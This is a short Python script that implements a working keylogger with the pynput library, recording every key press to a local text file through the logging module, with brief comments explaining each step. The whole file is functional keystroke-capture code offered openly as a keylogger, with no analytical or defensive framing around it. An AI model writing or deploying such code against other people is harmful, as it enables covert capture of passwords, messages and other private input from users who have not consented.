from pynput.keyboard import Listener
import logging

#The name of the file and what is sent to the file
logging.basicConfig(filename="keyLoggerFile.txt", level=logging.DEBUG, format='%(message)s')

#What is recorded with each key press
def on_press(key):  
    logging.info("{0}".format(key))

#Listens to keypresses
with Listener(on_press=on_press,) as listener:
    listener.join()  
